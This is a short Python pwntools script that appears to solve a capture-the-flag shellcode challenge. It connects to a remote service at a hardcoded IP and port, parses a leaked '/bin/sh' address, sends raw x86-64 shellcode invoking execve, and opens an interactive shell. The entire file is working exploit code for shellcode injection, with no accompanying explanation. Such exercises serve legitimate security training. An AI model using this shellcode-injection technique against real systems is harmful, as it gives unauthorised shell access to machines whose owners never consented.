from pwn import *

context.binary = './shellcode'
#p = process('./shellcode')
p = remote('20.48.83.165', 20005)

data = p.recvuntil('Execute execve("/bin/sh", NULL, NULL)')
binsh = data.split()[6]
log.warn(binsh)
shellcode = '\x48\xc7\xc7\x60\x40\x40\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05'
p.sendline(shellcode)

p.interactive()




